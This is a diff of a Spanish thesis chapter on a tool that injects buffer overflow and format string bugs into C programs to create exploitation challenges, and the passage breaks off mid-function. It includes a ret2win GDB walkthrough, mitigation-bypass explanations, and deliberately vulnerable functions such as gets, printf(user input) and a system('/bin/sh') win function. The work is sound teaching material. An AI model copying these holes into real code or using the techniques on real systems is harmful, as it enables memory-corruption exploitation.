@@ -1,17 +1,20 @@
-En esta sección se describe técnicamente parte por parte cómo se ha planificado el proyecto. El trabajo está dividido en tres secciones: análisis del código C, inyección de vulnerabilidades y soluciones a los retos.
+En esta sección se describe técnicamente, parte por parte, cómo se ha planificado el proyecto.
+El trabajo está dividido en tres secciones: análisis del código C, inyección de vulnerabilidades y soluciones a los retos.
 
-En la primera sección, se explican las herramientas utilizadas para analizar los códigos fuentes de entrada y como se manejan los mismos.
+En la primera sección, se explican las herramientas utilizadas para analizar los códigos fuentes de entrada y cómo se manejan.
 
-La segunda sección, explica los diferentes tipos de vulnerabilidades que se pueden inyectar y como se modifica el código fuente original para poder incluir estos nuevos flujos y funciones vulnerables.
+La segunda sección describe los diferentes tipos de vulnerabilidades que se pueden inyectar y como se modifica el código fuente original para poder incluir estos nuevos flujos y funciones vulnerables.
 
-En la tercera y última sección, se explican los diferentes mecanismos de resolución del problema y cómo son entregados al usuario.
+En la tercera y última sección se detallan los diferentes mecanismos de resolución del problema y cómo son entregados al usuario.
 \section{Análisis del código fuente}
 El proyecto está desarrollado en `Python', un lenguaje de programación sencillo que permite de forma rápida crear prototipos. En esta sección se describen las librerías, lógica y flujos que utiliza el programa.
 
-\subsection{Preparación del entorno}
-El desarrollo se ha realizado en un sistema operativo del tipo Linux, en concreto sobre la distribución de `Fedora', el software de este proyecto es compatible con cualquier sistema operativo de la familia Linux, que opere sobre arquitecturas del tipo \acrfull{x86} o \acrfull{x64}.
+\subsection{Preparación del entorno} \label{subsec:entorno}
+El desarrollo se ha realizado en un sistema operativo del tipo Linux, en concreto sobre la distribución de `Fedora'.
+El software de este proyecto es compatible con cualquier sistema operativo de la familia Linux que opere sobre arquitecturas del tipo \acrfull{x86} o \acrfull{x64}.
 
-Más adelante se explican las diferencias que tienen en la traducción al código máquina. Este programa va a trabajar mayoritariamente con la arquitectura \acrshort{x86}.
+Más adelante se explican las diferencias que tienen estas arquitecturas en la traducción al código máquina.
+Este programa trabaja mayoritariamente con la arquitectura \acrshort{x86}.
 
 Las dependencias del sistema necesarias para trabajar con el proyecto son las siguientes:
 \begin{itemize}
@@ -35,7 +38,9 @@ Las dependencias del sistema necesarias para trabajar con el proyecto son las si
     \end{itemize}
 \end{itemize}
 
-Las librerías de Python, se pueden instalar de forma automática mediante el gestor de paquetes `Poetry', para ello dentro del repositorio del proyecto, nos colocaremos en la carpeta `src' y podemos ejecutar dos comandos diferentes para conseguir el mismo objetivo, cualquiera de los dos instalará las dependencias necesarias a nivel de Python.
+Las librerías de Python se pueden instalar de forma automática mediante el gestor de paquetes `Poetry'.
+Para ello dentro del repositorio del proyecto será necesario acudir a la carpeta `src' y ejecutar dos comandos diferentes mostrados a continuación para conseguir el mismo objetivo.
+Cualquiera de los dos instalará las dependencias necesarias a nivel de Python.
 
 \begin{lstlisting}[language=bash, caption=Instalacion de dependencias Python]
 # Usando el fichero Makefile
@@ -46,9 +51,13 @@ $ poetry install
 \end{lstlisting}
 
 \subsection{Explicación del sistema AST}
-El proyecto, hace uso de los \acrfull{ast} \cite{ast}. Un \acrshort{ast}, es una estructura de datos en forma de árbol que representa la estructura sintáctica abstracta de un texto escrito en un lenguaje formal, como código fuente. Cada nodo del árbol representa una construcción que ocurre en el texto. Los \acrshort{ast} son usados ampliamente en compiladores porque representan la estructura del código de un programa. La sintaxis abstracta se caracteriza por no incluir todos los detalles que se encuentran en la sintaxis concreta. Por ejemplo, la estructura de árbol subyacente implica el agrupamiento de los paréntesis, y una construcción sintáctica como IF condición THEN puede representarse con un único nodo que tenga dos ramas.
+El proyecto, hace uso de los \acrfull{ast} \cite{ast}. Un \acrshort{ast}, es una estructura de datos en forma de árbol que representa la estructura sintáctica abstracta de un texto escrito en un lenguaje formal, como código fuente.
+Cada nodo del árbol representa una construcción que ocurre en el texto.
+Los \acrshort{ast} son usados ampliamente en compiladores porque representan la estructura del código de un programa.
+La sintaxis abstracta se caracteriza por no incluir todos los detalles que se encuentran en la sintaxis concreta.
+Por ejemplo, la estructura de árbol subyacente implica el agrupamiento de los paréntesis, y una construcción sintáctica como IF condición THEN puede representarse con un único nodo que tenga dos ramas.
 
-Esto es un ejemplo donde conviete el siguiente código Python sobre el algoritmo euclidiano a un \acrshort{ast}, mostrado en la figura \ref{fig:ast}:
+Esto es un ejemplo donde se convierte el siguiente código Python sobre el algoritmo euclidiano a un \acrshort{ast}, mostrado en la figura \ref{fig:ast}:
 
 \begin{lstlisting}[language=Python, caption=Python - Algoritmo euclidiano]
 def euclidean(a: int, b: int) -> int:
@@ -69,10 +78,16 @@ def euclidean(a: int, b: int) -> int:
 \FloatBarrier
 Como se puede observar en la figura \ref{fig:ast} este formato de árbol - rama no es sencillo de interpretar para un humano, sin embargo, de forma programática se puede analizar y/o alterar la estructura de forma relativamente sencilla.
 
-El funcionamiento de la librería es complejo, por debajo emplea el metodo Lex (Lexer) - \acrfull{yacc}. Está implementado usando la librería `PLY' \cite{ply}, la cual es una herramienta que tokeniza el código y mediante funciones que analizan estos tokens permite construir un \acrshort{ast}, que es lo que realiza la herramienta `pycparser'.
+El funcionamiento de la librería es complejo, ya que por debajo emplea el metodo Lex (Lexer) - \acrfull{yacc}.
+Está implementada usando la librería `PLY' \cite{ply}, la cual es una herramienta que tokeniza el código y mediante funciones que analizan estos tokens permite construir un \acrshort{ast}, que es lo que realiza la herramienta `pycparser'.
 
 \subsection{Análisis del código C con Python}
-El software desarrollado implementa dos clases principales. La primera clase se encarga de procesar el código C, convertirlo en un \acrshort{ast} utilizando la librería `pycparser', y modificar este árbol para introducir cambios estructurales, como por ejemplo, las vulnerabilidades, esta clase se llama `AstProcessor'. La segunda clase se especializa en analizar el \acrshort{ast} generado, buscando puntos críticos donde se puedan inyectar vulnerabilidades de manera deliberada, tiene el nombre de `VulnGen'.
+El software desarrollado implementa dos clases u objetos de programación principales.
+La primera clase se encarga de procesar el código C, convertirlo en un \acrshort{ast} utilizando la librería `pycparser', y modificar este árbol para introducir cambios estructurales, como por ejemplo, las vulnerabilidades.
+Esta clase se llama `AstProcessor'.
+La segunda clase se especializa en analizar el \acrshort{ast} generado, buscando puntos críticos donde se puedan inyectar vulnerabilidades de manera deliberada.
+Tiene el nombre de `VulnGen'.
+Para analizar los puntos críticos se hace uso de un objeto llamado \acrshort{sast} el cual revisa todos los posibles puntos críticos y genera diferentes casuisticas para `VulnGen'.
 
 \subsubsection{AstProcessor} \label{subsub:astproc}
 Esta clase de Python únicamente hace uso de la librería `pycparser'. En ella se han implementado todas las funcionalidades importantes que permiten analizar, modificar, guardar y compilar el código.
@@ -98,7 +113,10 @@ Una vez procesado el código al formato \acrshort{ast}, se hace un preprocesado 
 
 Aprovechando el funcionamiento de las clases en Python, una modificación en cualquiera de los objetos enlazados entre variables repercutirá directamente sobre el objeto original debido a que el lenguaje referencia el valor original en vez de generar una nueva copia.
 
-Para trabajar con el \acrshort{ast}, es muy importante entender el funcionamiento de los `scope' cuando se usa una variable en el código. El compilador primero intenta ubicar la variable en la función donde se está ejecutando, y en caso de no encontrar la variable, probará a buscarla de nuevo en el entorno global, siendo estrictos con la definición, un scope se define como código aislado entre dos llaves `\{\}'. Esto se puede comprobar con el siguiente código:
+Para trabajar con el \acrshort{ast}, es muy importante entender el funcionamiento de los `scope' cuando se usa una variable en el código.
+El compilador primero intenta ubicar la variable en la función donde se está ejecutando, y en caso de no encontrar la variable, probará a buscarla de nuevo en el entorno global.
+Siendo estrictos con el concepto, un scope se define como código aislado entre dos llaves `\{\}'.
+Esto se puede comprobar con el siguiente código:
 \pagebreak
 \begin{lstlisting}[language=C, caption=Scopes en C]
 int a = 1;
@@ -120,14 +138,16 @@ int main()
 
 En el resultado se puede ver que arroja un texto con valor numérico diferente según el scope donde fue ejecutada la instrucción de imprimir por pantalla.
 
-\subsubsection{\acrshort{sast}} \label{subsub:sast}
+\subsubsection{SAST} \label{subsub:sast}
 \acrshort{sast} es la clase encargada de localizar posibles funciones peligrosas.
-Se hace uso de los \acrshort{ast} y se analiza de forma recursiva el árbol tratando de simular un procesado del `stack'. El concepto de `stack' se explica en el apartado \ref{subsub:bofstack}.
+Se hace uso de los \acrshort{ast} y se analiza de forma recursiva el árbol tratando de simular un procesado del `stack'.
+El concepto de `stack' se explica en el apartado \ref{subsub:bofstack}.
 
-A día de la entrega del proyecto, la funcionalidad es reducida debido a que no es capaz de localizar vulnerabilidades. Cuando se procesan los diferentes tipos de asignaciones y llamadas, se revisa cuales de estas pueden ser peligrosas basado en una lista de llamadas a funciones que tratan con buffers o entrada del usuario.
+A fecha de la entrega de este proyecto, la funcionalidad es reducida debido a que no es capaz de localizar vulnerabilidades.
+Cuando se procesan los diferentes tipos de asignaciones y llamadas, se revisa cuales de estas pueden ser peligrosas basado en una lista de llamadas a funciones que tratan con buffers o entrada del usuario.
 Cuando se detecta una llamada peligrosa, por ejemplo, un `scanf', se genera un `problema' con todos los datos relevantes sobre la llamada: scope, stack (representa bajo qué condición se llama la función) y el \acrshort{ast} de la llamada.
 
-Según las condiciones en las cuales se ha ejecutado la función vulnerable, se da un veredicto sobre si es un punto de inyección de vulnerabilidades, por ejemplo:
+Según las condiciones en las cuales se ha ejecutado la función vulnerable, se obtiene un veredicto sobre si es un punto de inyección de vulnerabilidades, por ejemplo:
 
 \begin{lstlisting}[language=C, caption=Funciones peligrosas]
 int a = 1;
@@ -226,13 +246,13 @@ void main(){
 
 Como se puede observar en el ejemplo, la función vulnerable `scanf' se ha dividido en dos llamadas.
 La llamada para introducir el nombre en el buffer se intercambia por una función con el formato `input\_XXX' que toma como argumento el buffer destino.
-Además se añade una segunda llamada a la función `scanf' únicamente para procesar el entero manteniendo el comportamiento original.
+Además, se añade una segunda llamada a la función `scanf' únicamente para procesar el entero manteniendo el comportamiento original.
 
 \section{Vulnerabilidades}
 Esta sección se centra en explicar qué es un \acrfull{bof}, cómo ocurre, y por qué es tan peligroso.
-Además, se explorán las diferentes técnicas de explotación y las mitigaciones introducidas en el paso del tiempo para reducir el riesgo de ataques críticos.
-Comprender los fundamentos y las implicaciones de los desbordamientos de buffer es esencial dado que sigue siendo una amenaza vigente en muchos sistemas actuales.
-\subsection{Buffer Overflow}
+Además, se exploran las diferentes técnicas de explotación y las mitigaciones introducidas a lo largo del tiempo para reducir el riesgo de ataques críticos.
+Comprender los fundamentos y las implicaciones de los desbordamientos de buffer es esencial, ya que sigue siendo una amenaza vigente en muchos sistemas actuales.
+\subsection{Buffer Overflow} \label{subsub:bofstack}
 Un \acrfull{bof} o desbordamiento de buffer sucede cuando el tamaño del buffer donde se almacenan los datos es menor a la cantidad insertada.
 En la siguiente figura se puede ver en un ejemplo gráfico.
 \begin{figure}[htb!]
@@ -245,7 +265,7 @@ En la siguiente figura se puede ver en un ejemplo gráfico.
 En el caso arriba descrito la variable que contiene el texto tiene un tamaño de 8 bytes, sin embargo, se han introducido 10 suponiendo un overflow de 2 bytes.
 
 \subsubsection{Arquitectura de memoria Intel de 32bits}
-Para la redacción de este apartado ha sido muy relevante la información contenida en el libro `Assembly Language for x86 Processors' \cite{x86asm} debido a que se explica de forma detallada el funcionamiento interno de los ejecutables en lenguaje máquina.
+Para la redacción de este apartado ha sido fundamental la información proporcionada por el libro `Assembly Language for x86 Processors' \cite{x86asm} ya que ofrece una explicación detallada del funcionamiento interno de los ejecutables en lenguaje máquina.
 
 La arquitectura del tipo x86 se basa en una construcción del tipo `stack'. Un stack en el ámbito informático representa una estructura de datos que sigue el principio `\acrfull{lifo}', es decir, el último dato en entrar al stack es el primero en salir. Una operación del tipo `push' añadirá un dato al final del stack y la operación del tipo `pop' lo retirará.
 
@@ -287,10 +307,12 @@ La sección del stack está dividida en ventanas con los contextos de ejecución
     \label{fig:stack-arch}
 \end{figure}
 \FloatBarrier
-\subsubsection{Explotando un buffer overflow en 32bits}
-Con lo explicado en el punto anterior se puede observar que si se modifica el valor del \acrshort{eip}, el programa verá alterado su flujo normal de trabajo. En este caso, en ese registro se puede establecer una dirección de memoria maligna que permita ejecutar código arbitrario.
+\subsubsection{Explotando un buffer overflow en 32bits} \label{subsub:bof}
+Con lo explicado en el punto anterior se puede deducir que si se modifica el valor del \acrshort{eip}, el programa verá alterado su flujo normal de trabajo.
+En este caso, en ese registro se puede establecer una dirección de memoria maligna que permita ejecutar código arbitrario.
 
-En el siguiente código C de ejemplo se puede observar que tenemos declarada una función peligrosa llamada `ret2win'. Esta no se ejecuta en ningún momento en el código, sin embargo, existe y puede ser ejecutada alterando el flujo normal del programa.
+En el siguiente código C de ejemplo se puede observar que hay declarada una función peligrosa llamada `ret2win'.
+Esta no se ejecuta en ningún momento en el código, sin embargo, existe y puede ser ejecutada alterando el flujo normal del programa.
 
 \begin{lstlisting}[language=C, caption=Código vulnerable con función ret2win, label=snippet:simplebof]
 
@@ -314,13 +336,14 @@ void main(){
 \FloatBarrier
 En este caso, la función `gets' permite escribir por encima del tamaño del buffer y alterar el stack pudiendo cambiar el valor del \acrshort{eip} guardado.
 
-Es probable que compilando el código tal y como está, el compilador nos arroje varias alertas sobre el fallo. Además los compiladores en la actualidad implementan mitigaciones por defecto para evitar situaciones no deseadas.
+Es probable que, al compilar el código tal y como está, el compilador genere varias alertas sobre el fallo.
+Además los compiladores en la actualidad implementan mitigaciones por defecto para prevenir situaciones no deseadas.
 Estas mitigaciones se explican en el punto \ref{subsec:mitigaciones}.
 Para probar la explotación antes descrita se necesita compilar el binario con el siguiente comando:
 \begin{lstlisting}[language=bash, caption=Compilado de código con pocas mitigaciones y arquitectura 32bit]
 $ gcc -m32 -no-pie -fno-stack-protector -o ret2win.o ret2win.c
 \end{lstlisting}
-Una vez compilado, para probar la explotación del binario, lo ejecutaremos con el programa \acrfull{gdb}.
+Una vez compilado, con el objetivo de probar la explotación del binario, deberá ejecutarse con el programa \acrfull{gdb}.
 Para la explotación se puede usar el siguiente tutorial como referencia:
 \begin{lstlisting}[language=bash, caption=Explotación de GDB con binario ret2win]
 # Se carga el binario en gdb
@@ -401,8 +424,8 @@ Breakpoint 3, 0x080491ac in ret2win ()
 # Stack Buffer overflow conseguido, se ha ejecutado la funcion ret2win
 \end{lstlisting}
 
-Con esta prueba de concepto, se puede entender el peligro de un \acrshort{bof}.
-Aunque en esta demostración se tuviera una función `ret2win' que permite ejecutar una consola, hay otras técnicas que permiten llegar al mismo punto mediante librerías comunes como \acrshort{libc}.
+Esta prueba de concepto permite comprender el peligro de un \acrshort{bof}.
+Aunque en esta demostración se ha utilizado una función `ret2win' para ejecutar una consola, existen otras técnicas que logran el mismo objetivo utilizando librerías comunes como \acrshort{libc}.
 
 \subsubsection{Diferencias entre 32bits y 64bits}
 En la actualidad, las arquitecturas están basadas en sistemas 64bits.
@@ -411,21 +434,21 @@ En las arquitecturas 32bit los parametros se comparten mediante el stack como se
 En el caso de 64bit, los parametros se comparten mediante registros específicos. Además, el analogo al \acrshort{eip} que es el RIP en 64bits soporta direcciones de memoria menores a 0x00007FFFFFFFFFFF, es decir, 48bits.
 Dependiendo del sistema operativo se usan unos registros u otros para compartir los parámetros.
 
-Toda la información relacionada con la convención de llamadas de 64bit sobre linux se puede encontrar en el borrador publicado por la Linux Foundation \cite{x64asm}.
+Toda la información relacionada con la convención de llamadas de 64bit en Linux se puede encontrar en el documento publicado por Linux Foundation \cite{x64asm}.
 
 \subsection{Vulnerabilidad tipo Format String} \label{subsec:fmtstr}
-El bug de tipo format string fue descubierto a principios de los 2000.
-Al principio se consideró un bug, sin embargo, con el paso del tiempo se reconocieron los peligros que conllevaba este tipo de bug y pasó a considerarse una vulnerabilidad.
+El bug de tipo format string fue descubierto a principios de la decada de los 2000.
+Inicialmente se consideró un bug, sin embargo, con el tiempo se reconocieron los riesgos asociados a este tipo de bug y pasó a considerarse una vulnerabilidad.
 
-La vulnerabilidad consiste en aprovecharse de funciones que imprimen texto con formato, es decir, funciones como `printf, sprintf' o similares.
-Estas funciones normalmente requieren de un parametro con una cadena de formato (llamado format string) y los demás argumentos que serán reemplazados en el format string.
-Por ejemplo, una cadena de format string con el valor `Me llamo \%s' con un argumento de tipo `char \*buffer = pepe' devolvería el texto completo `Me llamo pepe'.
-Sin embargo, si la cantidad de argumentos es menor a las sustituciones necesarias en la cadena de formato, las variables que se tomarán provendrán del stack.
+La vulnerabilidad se explota a traves de funciones que imprimen texto con formato, es decir, funciones como `printf, sprintf' o similares.
+Estas funciones generalmente requieren de un parametro con una cadena de formato (llamado format string) y otros argumentos que serán reemplazados en el format string.
+Por ejemplo, una cadena de format string con el valor `Me llamo \%s' con un argumento de tipo `char \*buffer = Miguel' devolvería el texto completo `Me llamo Miguel'.
+No obstante, si el número de argumentos es menor a las sustituciones necesarias en la cadena de formato, las variables que se tomarán provendrán del stack.
 Además, las cadenas de formato contienen un parametro que permite escribir contenido al stack, con la cadena de formato `\%n' permite escribir 4 bytes a un puntero con el valor de la cuenta de los caracteres anteriores, es decir, si escribimos `ABCD\%n' el valor que almacenará en el puntero será 4.
 
-Si por algún motivo se tuviera una función vulnerable de este tipo dentro de un bucle, la probabilidad de que se convierta en una ejecución de código maligno es muy alta.
+Si en algún momento se tuviera una función vulnerable de este tipo dentro de un bucle, la probabilidad de que se conviertiera en una ejecución de código maligno es muy alta.
 
-En el siguiente fragmento de código se puede ver el resultado de una explotación satisfactoria de esta vulnerabilidad:
+En el siguiente fragmento de código se puede apreciar el resultado de una explotación satisfactoria de esta vulnerabilidad:
 \pagebreak
 \begin{lstlisting}[language=C, caption=Vulnerabilidad de tipo Format String]
 #include <stdio.h>
@@ -460,7 +483,7 @@ En la siguiente figura se puede ver de forma gráfica las mitigaciones introduci
 
 \subsubsection{No eXecute (NX)}
 Es la primera mitigación introducida en el compilado de binarios. Mediante esta medida de seguridad se evita que porciones del stack sean ejecutables.
-Por ejemplo, en un binario sin \acrshort{nx} activado, un usuario malicioso podría generar contenido en el stack tras un \acrshort{bof} y saltar a él mediante una instrucción del tipo `jmp esp' en el \acrshort{eip}, si el contenido del stack es una shellcode.
+Por ejemplo, en un binario sin \acrshort{nx} activado, un usuario malintencionado podría generar contenido en el stack tras un \acrshort{bof} y saltar a él mediante una instrucción del tipo `jmp esp' en el \acrshort{eip}, si el contenido del stack es una shellcode.
 
 La generación de una shellcode es posible mediante herramientas como `msfvenom'.
 Para cumplir con la explotación se debe localizar una instrucción en el binario del tipo `jmp esp' o `call esp' y sustituirla en el \acrshort{eip}. La shellcode generada debe ir con un preámbulo de instrucciones \acrfull{nop} (0x90) en caso de que no se pueda calcular con precisión dónde empezará a ejecutarse el código malicioso.
@@ -482,11 +505,11 @@ int main()
 
 \subsubsection{Canarios en el stack}
 Añadir la flag de \acrshort{nx} no soluciona todos los posibles problemas que pudiera generar un \acrshort{bof}.
-Se inventaron nuevas técnicas como por ejemplo `ret2libc', donde se hace uso de las librerías standard del sistema para obtener ejecución de código remota.
+Se han inventaron nuevas técnicas como por ejemplo `ret2libc', donde se hace uso de las librerías standard del sistema para obtener ejecución de código remota.
 La técnica consiste en usar una llamada a la función `system' ubicada en la librería \acrshort{libc}, la cual si se le añade el argumento `/bin/sh' también incluido en la misma librería, habilita una consola dando control al usuario maligno sobre el programa.
 
 Para evitar que un \acrshort{bof} permita sustituir el registro \acrshort{eip}, se añade un valor al principio de la función a ejecutar con un valor aleatorio calculado en la inicialización del binario.
-Si en el momento anterior al \acrfull{ret} el valor no coincide con el inicial, el programa se para frecuentemente con un error del formato `***stack smashing detected***'.
+Si en el momento anterior al \acrfull{ret} el valor no coincide con el inicial, el programa se detiene, frecuentemente con un error del formato `***stack smashing detected***'.
 Se puede tomar la siguiente figura como referencia:
 \FloatBarrier
 \begin{figure}
@@ -496,35 +519,35 @@ Se puede tomar la siguiente figura como referencia:
     \label{fig:stack-canary}
 \end{figure}
 \FloatBarrier
-Para poder identificar el canario en el stack de forma sencilla, suele estar ubicado en \acrshort{ebp} - `0xc' y acaba en un byte nulo.
+Resulta de gran utilidad para poder identificar el canario en el stack de forma sencilla, conocer que suele estar ubicado en \acrshort{ebp} - `0xc' y acaba en un byte nulo.
 
 \FloatBarrier
 En el compilador \acrshort{gcc}, la opción para habilitar el canario es `-fstack-protector-strong'.
-Para comprobar el funcionamiento descrito se puede reusar el snippet \ref{snippet:simplebof}
+Para comprobar el funcionamiento descrito se puede volver a utilizar el snippet \ref{snippet:simplebof}
 \subsubsection{Address Space Layout Randomization (ASLR)}
-Como medida adicional para evitar que una explotación sea satisfactoria se introdujo la aleatorización de las direcciones de memoria del binario.
+Como medida adicional para evitar la explotación sea exitosa de vulnerabilidad, se introdujo en el kernel Linux la aleatorización de las direcciones de memoria del binario.
 Cuando un binario se ejecuta, la dirección base de las librerías compartidas o del sistema cambian.
 Esta protección la gestiona el sistema operativo y se puede modificar su comportamiento mediante el fichero \path{/proc/sys/kernel/randomize_va_space}.
 Un valor de 0 significa que está desactivado, un valor de 1 activa el \acrshort{aslr} y el valor 2 lo activa también en los segmentos de datos y la memoria gestionada con la función `brk()'.
 Esta técnica dificulta el uso de exploits del tipo `ret2libc' en binarios compilados con librerías dinámicas.
 \subsubsection{Position Independant Executable (PIE)}
 Esta medida aleatoriza la posición de memoria donde se carga el binario cada vez que se ejecuta.
-Para que el comportamiento del ejecutable no cambie, las direcciones de memoria que se usan serán relativas en lugar de absolutas.
+Para que el comportamiento del ejecutable no cambie, las direcciones de memoria que se usan deberán ser relativas en lugar de absolutas.
 \subsection{Evasión de mitigaciones}
-En esta sección se habla sobre cuales son las formas más comunes de evadir las mitigaciones permitiendo vulnerar el programa.
+En este apartado se habla sobre cuales son las formas más comunes de evadir las mitigaciones permitiendo vulnerar el programa.
 Las mitigaciones pueden evitar que un pequeño fallo programático se convierta en crítico dificultando a los atacantes alterar el flujo del binario con repercusiones fatales.
-Sin embargo, teniendo en cuenta la definición de mitigación, se sabe que estas no aseguran que la explotación sea imposible.
+Sin embargo, teniendo en cuenta la definición de mitigación, es conocido que estas no aseguran que la explotación sea imposible.
 
 La forma más común de eludir estas medidas es obteniendo direcciones de memoria del stack mediante una vulnerabilidad del tipo format string explicado en el punto \ref{subsec:fmtstr}.
 
 Entender cual es el formato de los binarios en Linux es de gran relevancia para conseguir evadir algunas de las mitigaciones.
-Esta información puede consultarse en el recurso online citado en el punto \cite{x64asm} de la bibliografía.
+Esta información puede ampliarse en el recurso online citado en el punto \cite{x64asm} de la bibliografía.
 
 \subsubsection{Evasión de NX}
-Si de alguna forma el usuario malicioso consigue una vulnerabilidad que le permita alterar el flujo de ejecución, ese usuario podría usar la técnica `ret2libc' apuntando a la función `mprotect' y habilitando el bit de ejecución en la sección del stack de interes.
+Si de alguna forma el usuario malintencionado consigue una vulnerabilidad que le permita alterar el flujo de ejecución, ese usuario podría usar la técnica `ret2libc' apuntando a la función `mprotect' y habilitando el bit de ejecución en la sección del stack de interes.
 
 \subsubsection{Evasión de canario}
-En caso de que el usuario maligno disponga de una vulnerabilidad del tipo format string, podría aprovecharla para recuperar el valor del canario e inyectarlo en su payload evitando así modificar el valor del mismo.
+En caso de que el usuario malintencionado disponga de una vulnerabilidad del tipo format string, podría aprovecharla para recuperar el valor del canario e inyectarlo en su payload evitando así modificar el valor del mismo.
 Es importante anotar que para que esto funcione, el leak debe proceder de la misma función de la que se pretende obtener el canario.
 
 Otra opción para eludir esta mitigación es mediante una vulnerabilidad del tipo format string, haciendo que esta modifique el valor en la \acrfull{got} de la función `\_\_stack\_chk\_fail' por otra que no repercuta en el flujo del ejecutable.
@@ -532,13 +555,14 @@ Otra opción para eludir esta mitigación es mediante una vulnerabilidad del tip
 \subsubsection{Evasión de PIE} \label{subsub:pie}
 El objetivo principal para anular esta mitigación consiste en explotar una vulnerabilidad del tipo format string consiguiendo una dirección de memoria del stack.
 Esta dirección siempre se encontrará en un offset sobre la base.
-Además, las direcciones de memoria base del ejecutable siempre acabarán en `000', esto es debido a que lo que realmente se está aleatorizando en memoria son páginas que tienen un tamaño estándar de `0x1000'.
+Además, las direcciones de memoria base del ejecutable siempre acabarán en `000'.
+Esto es debido a que lo que realmente se está aleatorizando en memoria son páginas que tienen un tamaño estándar de `0x1000'.
 
 Por ejemplo, si la función `main' está ubicada en la dirección `0x4894' y sabiendo que la posición relativa sobre la base es de `0x894', se concluye que la base del binario se ubicará en `0x4000'
 % TODO EXAMPLE
 \subsubsection{Evasión del ASLR}
 A diferencia del \acrshort{pie}, este mecanismo hace uso de las cabeceras \acrfull{plt} y \acrfull{got} del binario.
-Cuando se hace una llamada a una función externa de una librería compartida, el binario revisará la tabla \acrshort{plt} la cual enlaza con una dirección de la tabla \acrshort{got}.
+Cuando se realiza una llamada a una función externa de una librería compartida, el binario revisará la tabla \acrshort{plt} la cual enlaza con una dirección de la tabla \acrshort{got}.
 Esta última tabla contiene la dirección de memoria real de la función a ejecutar.
 Por lo tanto, se pueden dar dos situaciones diferentes para eludir la mitigación:
 \begin{itemize}
@@ -552,8 +576,8 @@ Por lo tanto, se pueden dar dos situaciones diferentes para eludir la mitigació
 % TODO EXAMPLE
 
 \subsection{Inyección de vulnerabilidades} \label{subsec:vulns}
-Las vulnerabilidades a inyectar se han dividido en diferentes categorías según la dificultad.
-Según se aumente la dificultad mayores serán las mitigaciones empleadas.
+Las vulnerabilidades a inyectar se han dividido en cinco categorías según la dificultad.
+Cuanto más se aumente la dificultad, mayores serán las mitigaciones empleadas.
 \begin{itemize}
     \item Nivel 0: El binario no presenta ningún tipo de seguridad.
     \item Nivel 1: El binario presenta el bit \acrshort{nx} activado.
@@ -561,9 +585,9 @@ Según se aumente la dificultad mayores serán las mitigaciones empleadas.
     \item Nivel 3: El binario presenta \acrshort{pie}, canario y \acrshort{nx}.
     \item Nivel 4: El binario presenta \acrshort{aslr}, \acrshort{pie}, canario y \acrshort{nx}.
 \end{itemize}
-Las vulnerabilidades a la hora de escribir el proyecto consisten en transformaciones de inputs.
-Dependiendo de la dificultad posible inyección de vulnerabilidad tipo format string.
-Todas las vulnerabilidades inyectadas hacen uso de la función `strcpy' debido a que fuerza el \acrshort{bof} en la función esperada y con el comportamiento esperado.
+Las vulnerabilidades presentes durante la elaboración del proyecto se centran en las transformaciones de inputs.
+Dependiendo del nivel de dificultad, es posible la inyección de vulnerabilidades del tipo format string.
+Todas las vulnerabilidades inyectadas hacen uso de la función `strcpy' debido a que fuerza el \acrshort{bof} en la función esperada y con el comportamiento previsto.
 
 Las posibles funciones vulnerables se encuentran en el siguiente snippet de código:
 \begin{lstlisting}[language=C, caption=Posibles vulnerabilidades inyectadas]
@@ -571,64 +595,74 @@ Las posibles funciones vulnerables se encuentran en el siguiente snippet de cód
 void ret2win(){
     system("/bin/sh");
 }
-// Vulnerabilidades con diferentes funciones
+
 void input_gets_bof(char *buf) {
     char filler[64];
     char buffer[64];
     gets(buffer);
-    strcpy(buf, buffer);
+    strncpy(buf, buffer, sizeof(buffer));
 }
 
 void input_fgets_bof(char *buf){
     char filler[64];
     char buffer[64];
-    fgets(buffer, sizeof(filler)*2 + sizeof(buffer), stdin);
-    strcpy(buf, buffer);
+    fgets(buffer, sizeof(filler) + sizeof(buffer)*2, stdin);
+    strncpy(buf, buffer, sizeof(buffer));
 }
 
 void input_fgets_bof_canary(char *buf){
-    int canary = 0x20;
+    int canary = 0x42;
     char filler[64];
     char buffer[64];
-    fgets(buffer, sizeof(filler) + sizeof(buffer)*2, stdin);
-    if (canary != 0x20)
-        exit(127);
-    strcpy(buf, buffer);
+    fgets(buffer, sizeof(buffer) + sizeof(filler)*2, stdin);
+    if (canary != 0x42)
+        exit(139);
+    strncpy(buf, buffer, sizeof(buffer));
 }
 
 void input_gets_bof_canary(char *buf) {
-    int canary = 0x20;
+    int canary = 0x42;
     char filler[64];
     char buffer[64];
     gets(buffer);
-    if (canary != 0x20)
-        exit(127);
-    strcpy(buf, buffer);
+    if (canary != 0x42)
+        exit(139);
+    strncpy(buf, buffer, sizeof(buffer));
 }
 
 void input_scanf_bof(char *buf) {
     char filler[64];
     char buffer[64];
     scanf("%s", buffer);
-    strcpy(buf, buffer);
+    strncpy(buf, buffer, sizeof(buffer));
 }
 
 void input_scanf_bof_canary(char *buf) {
-    int canary = 0x20;
+    int canary = 0x42;
     char filler[64];
     char buffer[64];
     scanf("%s", buffer);
-    if (canary != 0x20)
-        exit(127);
-    strcpy(buf, buffer);
+    if (canary != 0x42)
+        exit(139);
+    strncpy(buf, buffer, sizeof(buffer));
 }
 
 
 void input_strcpy_bof(char *buf) {
     char filler[64];
     char buffer2[64];
-    fgets(buffer2, sizeof(buffer2), stdin);
-    strcpy(buf, buffer2);
+    fgets(buffer2, sizeof(filler)*2 + sizeof(buffer2), stdin);
+    strncpy(buf, buffer2, sizeof(buffer2));
+}
+
+void input_strcpy_bof_canary(char *buf) {
+    int canary = 0x42;
+    char filler[64];
+    char buffer2[64];
+    fgets(buffer2, sizeof(filler)*2 + sizeof(buffer2), stdin);
+    if (canary != 0x42)
+        exit(139);
+    strncpy(buf, buffer2, sizeof(buffer2));
 }
 
 void append_input_bof(char *buf) {
@@ -637,24 +671,186 @@ void append_input_bof(char *buf) {
     scanf("%s", buffer);
     strcat(buf, buffer);
 }
-// Leak, esta funcion no se inyecta directamente, unicamente se toma el cuerpo y se inyecta al principio de las funciones cuando la dificultad lo requiere
+// Estas funciones de leak no se inyectan directamente, dependen de las condiciones de seguridad
 void easy_leak() {
-    do
-    {
-        char init[32];
-        printf("\nBut first, I'll print what you type, take it as a gift: ");
+    do {
+        printf("system: %p\n", system);
+        printf("main: %p\n", main);
+        char init[16];
+        printf("\nBut first, I'll print what you type, max 16 bytes, take it as a gift: ");
         fgets(init, sizeof(init), stdin);
         printf(init);
         printf("\n");
-        printf("Now you can continue with what I asked you before :) \n");
